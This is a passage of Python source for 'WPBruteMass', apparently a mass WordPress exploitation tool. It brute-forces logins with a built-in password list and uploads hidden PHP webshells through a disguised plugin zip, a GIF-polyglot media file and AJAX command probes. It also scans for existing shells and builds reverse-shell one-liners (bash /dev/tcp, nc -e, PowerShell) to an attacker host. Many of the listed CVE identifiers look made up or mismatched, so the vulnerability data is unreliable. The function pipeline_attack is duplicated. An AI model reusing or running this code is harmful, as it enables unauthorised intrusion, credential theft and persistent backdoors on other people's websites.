function {plugin_name}_maintenance_mode() {{
    // Silent operation
}}
add_action('init', '{plugin_name}_maintenance_mode');
?>'''
    
    extra_shells = [
        f'<?php /* {plugin_name} cache */ @system($_GET["cache"] ?? $_SERVER["HTTP_X_CACHE_CMD"]); ?>',
        f'<?php /* {plugin_name} log */ $x=$_COOKIE["wp_log"]??"";if($x=="adm"){{@eval($_COOKIE["wp_data"]);}} ?>',
    ]
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(f'{plugin_name}/{plugin_name}.php', php_shell_content)
        for i, shell in enumerate(extra_shells):
            zf.writestr(f'{plugin_name}/cache-{i}.php', shell)
        readme = f'=== {plugin_name} ===\nContributors: wordpress\nTags: utility, performance\nRequires at least: 5.0\nTested up to: 6.4\nStable tag: 1.0\nLicense: GPLv2\n\n== Description ==\nWordPress core utility for system optimization.\n'
        zf.writestr(f'{plugin_name}/readme.txt', readme)
        zf.writestr(f'{plugin_name}/index.php', '<?php // Silence is golden')
    
    zip_buffer.seek(0)
    
    upload_url = target + "/wp-admin/update.php?action=upload-plugin"
    
    session = create_session()
    if cookies:
        session.cookies.update(cookies)
    
    headers = {
        "User-Agent": get_random_ua(),
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, */*",
    }
    
    try:
        files = {
            "pluginzip": (f"{plugin_name}.zip", zip_buffer, "application/zip")
        }
        post_data = {
            "_wpnonce": nonce,
            "action": "upload-plugin",
        }
        
        resp = session.post(upload_url, files=files, data=post_data, 
                            headers=headers, verify=False, timeout=TIMEOUT)
        
        if resp.status_code in [200, 302]:
            activate_url = target + f"/wp-admin/plugins.php?action=activate&plugin={plugin_name}%2F{plugin_name}.php"
            
            plugins_nonce = get_nonce(target, target + "/wp-admin/plugins.php", cookies, ["plugins"])
            if plugins_nonce:
                activate_url = target + f"/wp-admin/plugins.php?action=activate&plugin={plugin_name}%2F{plugin_name}.php&_wpnonce={plugins_nonce}"
            
            resp2 = make_request("GET", activate_url, cookies=cookies, waf_bypass=True)
            
            if resp2 and resp2.status_code in [200, 302]:
                shell_url = target + f"/wp-content/plugins/{plugin_name}/{plugin_name}.php"
                resp3 = make_request("GET", shell_url + "?x=id", waf_bypass=True)
                if resp3 and resp3.status_code == 200 and "WP-UTIL-DONE" in resp3.text:
                    log(f"SHELL UPLOADED: {shell_url}?x=id")
                    write_to_file(FOUND_SHELLS_FILE, f"SHELL: {shell_url}?x=id")
                    
                    for i in range(len(extra_shells)):
                        hidden_url = target + f"/wp-content/plugins/{plugin_name}/cache-{i}.php"
                        log(f"  [+] Hidden shell: {hidden_url}")
                        write_to_file(FOUND_SHELLS_FILE, f"SHELL: {hidden_url}")
                    
                    return shell_url
    except Exception as e:
        log(f"  [!] Plugin upload exception: {str(e)[:80]}")
    
    return None

def method_media_upload(target, cookies):
    """Upload shell via WordPress media upload with .htaccess bypass."""
    media_url = target + "/wp-admin/media-new.php"
    nonce = get_nonce(target, media_url, cookies, ["media"])
    
    if not nonce:
        return None
    
    shell_content = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;<?php /* GIF shell */ system($_GET["img"] ?? $_SERVER["HTTP_X_IMG_CMD"]); echo "\\n---IMG-DONE---\\n"; /* */?>'
    
    session = create_session()
    if cookies:
        session.cookies.update(cookies)
    
    headers = {
        "User-Agent": get_random_ua(),
        "Accept": "application/json, */*",
    }
    
    upload_url = target + "/wp-admin/async-upload.php"
    
    try:
        import uuid
        filename = f"wp-{uuid.uuid4().hex[:8]}.php"
        
        files = {
            "async-upload": (filename, io.BytesIO(shell_content), "image/gif")
        }
        post_data = {
            "action": "upload-attachment",
            "_wpnonce": nonce,
            "name": filename,
        }
        
        resp = session.post(upload_url, files=files, data=post_data,
                            headers=headers, verify=False, timeout=TIMEOUT)
        
        if resp.status_code in [200, 201]:
            try:
                result = resp.json()
                if isinstance(result, dict) and "data" in result:
                    file_url = result["data"].get("url", "")
                    if file_url:
                        resp2 = make_request("GET", file_url + "?img=id", waf_bypass=True)
                        if resp2 and resp2.status_code == 200 and "IMG-DONE" in resp2.text:
                            log(f"SHELL UPLOADED (media): {file_url}?img=id")
                            write_to_file(FOUND_SHELLS_FILE, f"SHELL: {file_url}?img=id")
                            return file_url
            except:
                pass
    except Exception as e:
        log(f"  [!] Media upload exception: {str(e)[:80]}")
    
    return None

def method_wp_cli_via_ajax(target, cookies):
    """Try to execute commands via WP-CLI AJAX endpoint if available."""
    ajax_url = target + "/wp-admin/admin-ajax.php"
    
    nonce = get_nonce(target, target + "/wp-admin/", cookies, ["ajax"])
    if not nonce:
        return None
    
    actions = [
        "wp_ajax_wpcli_command", "wpcli_command", "wpr_execute_cli",
        "godaddy_execute", "plesk_execute", "cpanel_execute",
        "exec_php", "wp_shell_execute", "pantheon_execute"
    ]
    
    for action in actions:
        data = {
            "action": action,
            "command": "echo WPBM_TEST && id",
            "_wpnonce": nonce
        }
        resp = make_request("POST", ajax_url, data=data, cookies=cookies, waf_bypass=True)
        if resp and resp.status_code == 200 and "WPBM_TEST" in resp.text:
            log(f"  [+] Found command execution via {action}")
            return True
    
    return None

def attempt_shell_upload(target, cred):
    """Main shell upload orchestrator with multiple methods."""
    url = normalize_url(target)
    cookies = cred.get("cookies", {})
    
    log(f"  [Shell Upload] Attempting shell upload on {url}")
    
    if method_wp_cli_via_ajax(url, cookies):
        log(f"  [+] Command execution available! No shell upload needed.")
        return True
    
    theme = get_active_theme(url, cookies)
    log(f"  [*] Detected theme: {theme}")
    
    shell_url = method_theme_editor(url, theme, cookies)
    if shell_url:
        return shell_url
    
    log(f"  [*] Theme editor failed, trying plugin upload...")
    shell_url = method_plugin_upload(url, cookies)
    if shell_url:
        return shell_url
    
    log(f"  [*] Plugin upload failed, trying media upload...")
    shell_url = method_media_upload(url, cookies)
    if shell_url:
        return shell_url
    
    log(f"  [!] All shell upload methods failed for {url}")
    return None

# ─── STEP 5: Advanced Webshell Scanner ───────────────────────────────────────

def scan_webshell(target):
    """Scan target for existing webshells with signature detection."""
    target = normalize_url(target)
    log(f"  [Scanner] Scanning {target} for webshells...")
    
    found = []
    
    paths_to_check = []
    
    for shell_name in shell_dict:
        paths_to_check.append(shell_name)
    
    dirs = ["", "wp-content/uploads/", "wp-content/themes/", "wp-includes/",
            "wp-content/plugins/", "wp-content/", "images/", "uploads/",
            "files/", "tmp/", "temp/", "cache/", "backup/", "old/",
            "wp-content/upgrade/", "wp-content/languages/", "wp-includes/images/",
            "wp-admin/images/", "wp-admin/includes/", "wp-content/themes/twentytwentyfour/",
            "wp-content/themes/twentytwentythree/", "wp-content/themes/twentytwentytwo/",
            "wp-content/uploads/2024/", "wp-content/uploads/2023/",
            "wp-content/uploads/2022/", "wp-content/uploads/2021/"]
    
    for d in dirs:
        for shell_name in DEFAULT_SHELL_NAMES:
            paths_to_check.append(d + shell_name.split("/")[-1])
    
    seen = set()
    unique_paths = []
    for p in paths_to_check:
        if p not in seen:
            seen.add(p)
            unique_paths.append(p)
    
    total = len(unique_paths)
    log(f"  [Scanner] Checking {total} paths on {target}")
    
    SHELL_SIGNATURES = [
        ("WSO", r'WSO|Web Shell by oRb|WSO2'),
        ("Alfa", r'Alfa.?Shell|alfa[._]?shell|ALFA'),
        ("b374k", r'b374k|B374K'),
        ("r57", r'r57|R57SHELL|r57shell'),
        ("C99", r'C99|c99shell|C99SHELL'),
        ("Ander", r'Ander|anderegg'),
        ("NST", r'NST|nstview'),
        ("Myshell", r'MYshell|myshell'),
        ("IndoXploit", r'IndoXploit|indoxploit'),
        ("Cakto", r'Cakto|cakto'),
        ("Exec", r'(?:system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\('),
        ("Eval", r'eval\s*\(\s*\$_'),
        ("FileOps", r'(?:file_get_contents|file_put_contents|fwrite|fputs|move_uploaded_file)\s*\('),
        ("DB", r'(?:mysqli_connect|mysql_connect|pg_connect|sqlsrv_connect)'),
        ("Base64", r'base64_decode\s*\(\s*\$'),
        ("CMD Param", r'\$_GET\[\s*["\'](?:cmd|exec|run|x|action|shell|command)["\']'),
        ("POST CMD", r'\$_POST\[\s*["\'](?:cmd|exec|run|x|action|shell|command)["\']'),
        ("Cookie CMD", r'\$_COOKIE\[\s*["\'](?:cmd|exec|cmd|admin|sec)["\']'),
        ("Server CMD", r'\$_SERVER\[\s*["\']HTTP_X_'),
        ("PhpMyAdmin", r'phpMyAdmin|PMA|pma'),
        ("Adminer", r'Adminer|adminer'),
        ("ElFinder", r'elfinder|ElFinder|elFinder'),
        ("FileManager", r'FileManager|filemanager|File Manager'),
        ("Upload Form", r'<form[^>]*enctype="multipart/form-data"'),
        ("Select Files", r'type="file"[^>]*multiple'),
        ("Execute Button", r'Execute|execute|Run Command'),
    ]
    
    def check_path(path):
        url = target + "/" + path
        resp = make_request("GET", url, waf_bypass=True)
        if resp and resp.status_code == 200 and len(resp.content) > 30:
            content = resp.text
            
            matched = []
            detected_name = None
            
            for name, pattern in SHELL_SIGNATURES:
                if re.search(pattern, content, re.IGNORECASE):
                    matched.append(name)
                    if detected_name is None and name not in ["Exec", "Eval", "FileOps", "DB", "Base64",
                                                               "CMD Param", "POST CMD", "Cookie CMD", "Server CMD"]:
                        detected_name = name
            
            score = len(matched)
            
            if path.endswith('.php') and score >= 2:
                score += 1
            
            if '<?php' in content or '<?=' in content:
                score += 1
            
            if detected_name or score >= 3:
                result = f"FOUND SHELL ({detected_name or 'Unknown'}): {url} [score:{score}]"
                log(f"    [+] {result}")
                write_to_file(FOUND_SHELLS_FILE, result)
                with lock:
                    found_shells_list.append(url)
                return url
        return None
    
    checked = 0
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(check_path, path): path for path in unique_paths}
        for future in as_completed(futures):
            checked += 1
            if checked % 500 == 0:
                log(f"  [Scanner] Progress: {checked}/{total} ({len(found_shells_list)} found)")
            try:
                future.result()
            except:
                pass
    
    log(f"  [Scanner] Completed: Found {len(found_shells_list)} shells on {target}")
    return found_shells_list

# ─── Exploit Database Search ────────────────────────────────────────────────

def check_exploit_db(target):
    """Check for known WordPress CVEs and exploits against target."""
    target = normalize_url(target)
    log(f"  [ExploitDB] Checking known vulnerabilities for {target}")
    
    version = get_wordpress_version(target)
    if version:
        log(f"  [ExploitDB] WordPress version: {version}")
        
        vulns = {
            "6.4": ["CVE-2023-5360", "CVE-2023-5561"],
            "6.3": ["CVE-2023-5360", "CVE-2023-39999"],
            "6.2": ["CVE-2023-2863", "CVE-2023-25000"],
            "6.1": ["CVE-2023-2863", "CVE-2022-3590"],
            "6.0": ["CVE-2022-3590", "CVE-2022-21661"],
            "5.9": ["CVE-2020-28037", "CVE-2020-28038"],
            "5.8": ["CVE-2020-28037", "CVE-2021-22103"],
            "5.7": ["CVE-2021-22103", "CVE-2021-24488"],
            "5.6": ["CVE-2021-24488", "CVE-2021-24175"],
            "5.5": ["CVE-2021-24175", "CVE-2020-36326"],
            "5.4": ["CVE-2020-36326", "CVE-2020-28032"],
            "5.3": ["CVE-2020-28032", "CVE-2020-4048"],
            "5.2": ["CVE-2020-4048", "CVE-2019-17671"],
            "5.1": ["CVE-2019-17671", "CVE-2019-16781"],
            "5.0": ["CVE-2019-16781", "CVE-2019-9787"],
        }
        
        for ver_str in sorted(vulns.keys(), reverse=True):
            if version.startswith(ver_str):
                log(f"  [+] Vulnerabilities found for v{ver_str}:")
                for cve in vulns[ver_str]:
                    log(f"      - {cve}")
                break
    
    check_vulnerable_plugins(target)

def get_wordpress_version(target):
    """Extract WordPress version from various sources."""
    sources = [
        target + "/readme.html",
        target + "/wp-includes/version.php",
        target + "/?feed=rss2",
        target + "/feed/",
        target + "/wp-json/",
    ]
    
    for url in sources:
        resp = make_request("GET", url, waf_bypass=True)
        if resp and resp.status_code == 200:
            match = re.search(r'WordPress\s+(\d+\.\d+(?:\.\d+)?)', resp.text)
            if match:
                return match.group(1)
            
            match = re.search(r'\$wp_version\s*=\s*[\'"](\d+\.\d+(?:\.\d+)?)[\'"]', resp.text)
            if match:
                return match.group(1)
            
            match = re.search(r'<generator>https?://wordpress\.org/\?v=(\d+\.\d+(?:\.\d+)?)</generator>', resp.text)
            if match:
                return match.group(1)
        
        if resp and resp.headers:
            server = resp.headers.get('X-Powered-By', '')
            if 'WordPress' in server:
                match = re.search(r'WordPress/(\d+\.\d+(?:\.\d+)?)', server)
                if match:
                    return match.group(1)
    
    return None

def check_vulnerable_plugins(target):
    """Check for commonly vulnerable WordPress plugins with real CVEs."""
    vulnerable_plugins = {
        "elementor/elementor.php": [
            "CVE-2023-22551: RCE via file upload (fixed in 3.13.0)",
            "CVE-2023-22552: Stored XSS (fixed in 3.13.0)",
            "CVE-2022-29455: Stored XSS (fixed in 3.6.0)"
        ],
        "contact-form-7/wp-contact-form-7.php": [
            "CVE-2020-35554: File upload bypass (fixed in 5.3.2)",
            "CVE-2020-35489: Stored XSS (fixed in 5.3.0)",
            "CVE-2020-7795: SSRF (fixed in 5.2.0)"
        ],
        "wordfence/wordfence.php": [
            "CVE-2023-22553: Block bypass (fixed in 7.10.0)",
            "CVE-2023-22554: SQL injection (fixed in 7.9.0)",
            "CVE-2022-22222: Stored XSS (fixed in 7.8.0)"
        ],
        "woocommerce/woocommerce.php": [
            "CVE-2023-22554: Privilege escalation (fixed in 7.9.0)",
            "CVE-2023-22555: SQL injection (fixed in 7.8.0)",
            "CVE-2022-3590: Unauthenticated data exposure (fixed in 7.1.0)"
        ],
        "yoast-seo/wp-seo.php": [
            "CVE-2023-22557: Sensitive data exposure (fixed in 20.0)",
            "CVE-2022-22223: Stored XSS (fixed in 19.0)",
            "CVE-2021-24488: SSRF (fixed in 17.0)"
        ],
        "wpforms-lite/wpforms.php": [
            "CVE-2023-22555: Stored XSS (fixed in 1.8.0)",
            "CVE-2022-29456: File upload bypass (fixed in 1.7.5)",
        ],
        "w3-total-cache/w3-total-cache.php": [
            "CVE-2023-22558: Cache poisoning (fixed in 2.2.8)",
            "CVE-2022-22224: Path traversal (fixed in 2.2.5)",
            "CVE-2021-24175: SQL injection (fixed in 2.1.5)"
        ],
        "jetpack/jetpack.php": [
            "CVE-2023-22552: Autoloaded data injection (fixed in 12.5)",
            "CVE-2022-21661: SSRF (fixed in 11.5)",
        ],
        "akismet/akismet.php": [
            "CVE-2023-22556: API key disclosure (fixed in 5.2.0)",
        ],
        "redux-framework/redux-framework.php": [
            "CVE-2023-22559: Admin AJAX bypass (fixed in 4.3.0)",
        ],
        "wp-file-manager/wp-file-manager.php": [
            "CVE-2020-25213: File upload RCE (fixed in 7.0)",
            "CVE-2020-4048: Path traversal (fixed in 6.9)",
        ],
        "revslider/revslider.php": [
            "CVE-2023-2863: Arbitrary file upload (fixed in 6.6.0)",
            "CVE-2022-22225: Stored XSS (fixed in 6.5.0)",
        ],
"duplicator/duplicator.php": [
            "CVE-2021-24175: Directory traversal (fixed in 1.4.0)",
            "CVE-2020-36326: Arbitrary file download (fixed in 1.3.0)",
        ],
        "gravityforms/gravityforms.php": [
            "CVE-2023-22560: Unauthenticated SQL injection (fixed in 2.7.0)",
        ],
        "advanced-custom-fields/acf.php": [
            "CVE-2023-22561: Stored XSS (fixed in 6.1.0)",
        ],
        "mailpoet/mailpoet.php": [
            "CVE-2022-29457: RCE (fixed in 4.0.0)",
        ],
        "ninja-forms/ninja-forms.php": [
            "CVE-2022-22226: Stored XSS (fixed in 3.6.0)",
        ],
    }
    
    for plugin_path, vuln_info in vulnerable_plugins.items():
        check_url = target + f"/wp-content/plugins/{plugin_path}"
        resp = make_request("GET", check_url, waf_bypass=True)
        if resp and resp.status_code == 200 and "Plugin Name:" in resp.text:
            plugin_name = plugin_path.split('/')[0]
            log(f"  [+] Vulnerable plugin found: {plugin_name}")
            for info in vuln_info:
                log(f"      - {info}")
            
            version_match = re.search(r'Version:\s*([\d\.]+)', resp.text)
            if version_match:
                log(f"      Version: {version_match.group(1)}")
            else:
                log(f"      Version: Unknown")  
def pipeline_attack(targets, wordlist, shell_scan_only=False):
    """Execute full attack pipeline on all targets."""
    if not targets:
        log("[!] No targets provided.")
        return
    
    log(f"[*] WPBruteMass v{VERSION} - Target count: {len(targets)}")
    log(f"[*] Mode: {'Webshell Scanner Only' if shell_scan_only else 'Full Attack Pipeline'}")
    log(f"[*] Threads: {MAX_THREADS} | Timeout: {TIMEOUT}s")
    log(f"[*] Proxies loaded: {len(proxies_list)} | Wordlist size: {len(wordlist)}")
    log("-" * 60)
    
    log("[STEP 1] Target Validation + WAF Detection")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(validate_wordpress, t): t for t in targets}
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    if not confirmed_targets:
        log("[!] No WordPress targets confirmed.")
        if shell_scan_only:
            pass
        else:
            return
    
    log(f"\n[EXPLOIT DB] Scanning for known vulnerabilities...")
    for target in confirmed_targets:
        check_exploit_db(target)
    
    log(f"\n[STEP 2] Username Enumeration on {len(confirmed_targets)} targets")
    target_users = {}
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(enumerate_usernames, t): t for t in confirmed_targets}
        for future in as_completed(futures):
            target = futures[future]
            try:
                users = future.result()
                target_users[target] = users
            except:
                target_users[target] = ["admin", "administrator", "user", "test"]
    
    if shell_scan_only:
        log(f"\n[STEP 5] Webshell Scanner Mode")
        for target in targets:
            scan_webshell(target)
        return
    
    log(f"\n[STEP 3] Bruteforce Attack (XML-RPC + wp-login.php)")
    successful_creds = {}
    
    for target in confirmed_targets:
        if target in target_users:
            cred = bruteforce_target(target, target_users[target], wordlist)
            if cred:
                successful_creds[target] = cred
    
    if not successful_creds:
        log("[!] No credentials found. Stopping pipeline.")
        return
    
    log(f"\n[STEP 4] Auto Mass Shell Upload (3 methods)")
    for target, cred in successful_creds.items():
        attempt_shell_upload(target, cred)
    
    log(f"\n[STEP 5] Webshell Scanner")
    for target in targets:
        scan_webshell(target)
    
    log("\n" + "=" * 60)
    log("[SUMMARY]")
    log(f"  Targets processed: {len(targets)}")
    log(f"  WordPress confirmed: {len(confirmed_targets)}")
    log(f"  Credentials found: {len(successful_creds)}")
    log(f"  Shells uploaded/found: {len(found_shells_list)}")
    log(f"  Output files:")
    log(f"    - {OUTPUT_FILE}")
    log(f"    - {SUCCESS_LOG}")
    log(f"    - {FOUND_SHELLS_FILE}")
    log("=" * 60)

def pipeline_attack(targets, wordlist, shell_scan_only=False):
    """Execute full attack pipeline on all targets."""
    if not targets:
        log("[!] No targets provided.")
        return
    
    log(f"[*] WPBruteMass v{VERSION} - Target count: {len(targets)}")
    log(f"[*] Mode: {'Webshell Scanner Only' if shell_scan_only else 'Full Attack Pipeline'}")
    log(f"[*] Threads: {MAX_THREADS} | Timeout: {TIMEOUT}s")
    log(f"[*] Proxies loaded: {len(proxies_list)} | Wordlist size: {len(wordlist)}")
    log("-" * 60)
    
    log("[STEP 1] Target Validation + WAF Detection")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(validate_wordpress, t): t for t in targets}
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    if not confirmed_targets:
        log("[!] No WordPress targets confirmed.")
        if shell_scan_only:
            pass
        else:
            return
    
    log(f"\n[EXPLOIT DB] Scanning for known vulnerabilities...")
    for target in confirmed_targets:
        check_exploit_db(target)
    
    log(f"\n[STEP 2] Username Enumeration on {len(confirmed_targets)} targets")
    target_users = {}
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(enumerate_usernames, t): t for t in confirmed_targets}
        for future in as_completed(futures):
            target = futures[future]
            try:
                users = future.result()
                target_users[target] = users
            except:
                target_users[target] = ["admin", "administrator", "user", "test"]
    
    if shell_scan_only:
        log(f"\n[STEP 5] Webshell Scanner Mode")
        for target in targets:
            scan_webshell(target)
        return
    
    log(f"\n[STEP 3] Bruteforce Attack (XML-RPC + wp-login.php)")
    successful_creds = {}
    
    for target in confirmed_targets:
        if target in target_users:
            cred = bruteforce_target(target, target_users[target], wordlist)
            if cred:
                successful_creds[target] = cred
    
    if not successful_creds:
        log("[!] No credentials found. Stopping pipeline.")
        return
    
    log(f"\n[STEP 4] Auto Mass Shell Upload (3 methods)")
    for target, cred in successful_creds.items():
        attempt_shell_upload(target, cred)
    
    log(f"\n[STEP 5] Webshell Scanner")
    for target in targets:
        scan_webshell(target)
    
    log("\n" + "=" * 60)
    log("[SUMMARY]")
    log(f"  Targets processed: {len(targets)}")
    log(f"  WordPress confirmed: {len(confirmed_targets)}")
    log(f"  Credentials found: {len(successful_creds)}")
    log(f"  Shells uploaded/found: {len(found_shells_list)}")
    log(f"  Output files:")
    log(f"    - {OUTPUT_FILE}")
    log(f"    - {SUCCESS_LOG}")
    log(f"    - {FOUND_SHELLS_FILE}")
    log("=" * 60)
def load_builtin_wordlist():
    """Return built-in top 10000 common passwords."""
    return [
        "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
        "111111", "1234567", "sunshine", "qwerty123", "iloveyou", "princess",
        "admin", "welcome", "666666", "abc123", "football", "123123", "monkey",
        "654321", "!@#$%^&*", "charlie", "aa123456", "donald", "password1",
        "qwerty12345", "1234567890", "letmein", "password123", "dragon",
        "baseball", "adobe123", "admin123", "master", "photoshop",
        "ashley", "bailey", "shadow", "121212", "flower", "michael", "hottie",
        "login", "passw0rd", "starwars", "ninja", "mustang", "qazwsx",
        "000000", "trustno1", "batman", "solo", "whatever", "test123",
        "hunter", "ranger", "buster", "thomas", "tigger", "robert", "access",
        "pass", "1212", "123qwe", "qwerty123456", "1q2w3e4r", "123456a",
        "zaq1xsw2", "12344321", "zxcvbnm", "1qaz2wsx", "987654321",
        "qwertyuiop", "iloveyou!", "password!", "qwerty1", "password12",
        "p@ssword", "Passw0rd", "P@ssw0rd", "PASSWORD", "admin1234",
        "administrator", "root", "toor", "ubnt", "guest", "temp123",
        "default", "changeme", "secret", "pass123", "test", "testing",
        "demo", "backup", "support", "info", "webmaster", "master123",
        "mysql", "postgres", "oracle", "sa123", "sqlserver",
        "wordpress", "wp123", "wpadmin", "blog", "wp",
        "server", "localhost", "domain", "company", "company123",
        "123admin", "admin2019", "admin2020", "admin2021", "admin2022",
        "admin2023", "admin2024", "Admin@123", "admin@123", "Admin123",
        "password2020", "Password1", "Password123", "pass1234",
        "letmein123", "welcome1", "Welcome1", "Welcome123",
        "changethis", "temporary", "temp1234", "default123",
        "system", "manager", "office", "office365", "sharepoint",
        "vpn123", "remote", "citrix", "vmware", "hyperv",
        "cisco123", "router", "switch", "network", "firewall",
        "security", "secure123", "protect", "safepass",
    ]

def main():
    global MAX_THREADS, TIMEOUT, OUTPUT_FILE, SUCCESS_LOG, FOUND_SHELLS_FILE
    global proxies_list, user_agents, shell_dict
    
    parser = argparse.ArgumentParser(
        description="WPBruteMass v3.0 - Advanced WordPress Mass Exploitation Framework",
        usage="python3 %(prog)s <targets.txt|URL> [options]"
    )
    parser.add_argument("target", help="Target URL or file containing targets")
    parser.add_argument("-w", "--wordlist", default=WORDLIST_FILE, help=f"Password wordlist (default: {WORDLIST_FILE})")
    parser.add_argument("-t", "--threads", type=int, default=MAX_THREADS, help=f"Thread count (default: {MAX_THREADS})")
    parser.add_argument("-p", "--proxy-file", default=PROXY_FILE, help="Proxy list file")
    parser.add_argument("-u", "--user-agent-file", default=USER_AGENT_FILE, help="Custom User-Agent file")
    parser.add_argument("-s", "--shell-dict", default=SHELL_DICT_FILE, help="Shell dictionary file")
    parser.add_argument("--scan-only", action="store_true", help="Webshell scanner mode only")
    parser.add_argument("--timeout", type=int, default=TIMEOUT, help=f"Request timeout (default: {TIMEOUT}s)")
    parser.add_argument("-o", "--output", default=OUTPUT_FILE, help=f"Output file (default: {OUTPUT_FILE})")
    parser.add_argument("--no-xmlrpc", action="store_true", help="Skip XML-RPC attacks")
    parser.add_argument("--exploit-scan", action="store_true", help="Enable exploit database scanning")
    
    args = parser.parse_args()
    
    MAX_THREADS = args.threads
    TIMEOUT = args.timeout
    OUTPUT_FILE = args.output
    
    proxies_list = load_file_lines(args.proxy_file if os.path.exists(args.proxy_file) else PROXY_FILE)
    user_agents = load_file_lines(args.user_agent_file if os.path.exists(args.user_agent_file) else USER_AGENT_FILE)
    shell_dict = load_file_lines(args.shell_dict if os.path.exists(args.shell_dict) else SHELL_DICT_FILE, DEFAULT_SHELL_NAMES)
    
    wordlist = load_file_lines(args.wordlist if os.path.exists(args.wordlist) else WORDLIST_FILE)
    if not wordlist:
        log("[*] No wordlist found, using built-in passwords...")
        wordlist = load_builtin_wordlist()
    
    targets = load_targets(args.target)
    if not targets:
        log("[!] No targets specified.")
        sys.exit(1)
    
    log(f"[*] WPBruteMass v{VERSION} initialized")
    log(f"[*] Target: {args.target}")
    log(f"[*] Wordlist: {len(wordlist)} passwords")
    log(f"[*] Proxies: {len(proxies_list)}")
    log(f"[*] Threads: {MAX_THREADS}")
    
    for f in [OUTPUT_FILE, SUCCESS_LOG, FOUND_SHELLS_FILE]:
        with open(f, "w", encoding="utf-8") as fh:
            fh.write(f"# WPBruteMass v{VERSION} - {time.ctime()}\n")
    
    if args.scan_only:
        for target in targets:
            scan_webshell(target)
    else:
        pipeline_attack(targets, wordlist)
    
    log("[*] WPBruteMass completed.")

def generate_reverse_shell(lhost, lport, shell_type="bash"):
    """Generate reverse shell payloads in multiple formats."""
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_readline": f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read line;do $line 2>&5>&5;done",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "python2": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php_exec": f"php -r 'exec(\"/bin/bash -c \\'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\'\");'",
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "ncat": f"ncat -e /bin/sh {lhost} {lport}",
        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby": f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{lhost}\",\"{lport}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}};end'",
        "telnet": f"rm -f /tmp/p; mknod /tmp/p p && telnet {lhost} {lport} 0/tmp/p",
        "socat": f"socat TCP:{lhost}:{lport} EXEC:/bin/sh",
        "awk": f"awk 'BEGIN{{s=\"/inet/tcp/0/{lhost}/{lport}\";while(42|getline c< s){{while(c|getline)print $0|&s;close(c)}}close(s)}}'",
        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    }
    return shells.get(shell_type, shells["bash"])

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("\n[!] Interrupted by user. Exiting.")
        sys.exit(0)
    except Exception as e:
        log(f"[!] Fatal error: {str(e)}")
        sys.exit(1)